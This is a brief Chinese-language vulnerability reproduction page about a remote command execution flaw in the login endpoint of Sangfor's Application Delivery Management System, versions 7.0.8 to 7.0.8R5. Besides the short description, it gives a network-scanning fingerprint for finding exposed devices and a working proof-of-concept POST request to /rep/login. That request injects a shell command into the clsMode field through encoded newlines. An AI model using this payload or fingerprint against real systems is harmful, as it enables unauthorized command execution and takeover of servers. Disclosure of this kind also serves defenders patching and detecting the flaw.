# 深信服 应用交付管理系统 login 远程命令执行漏洞

## 漏洞描述

深信服 应用交付管理系统 login 存在远程命令执行漏洞，攻击者通过漏洞可以获取服务器权限，执行任意命令

## 漏洞影响

<a-checkbox checked>深信服 应用交付管理系统 7.0.8-7.0.8R5</a-checkbox></br>

## 网络测绘

<a-checkbox checked>fid="iaytNA57019/kADk8Nev7g=="</a-checkbox></br>

## 漏洞复现

登陆页面

![img](../../../.vuepress/public/img/1675307887742-7f1d91ab-0fc3-4b09-b434-70466ec13871.png)

验证POC

```plain
POST /rep/login 

clsMode=cls_mode_login%0Als%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123
```

![img](../../../.vuepress/public/img/1675307928621-8722e4f7-ddd8-44ee-9010-4f9189a12081.png)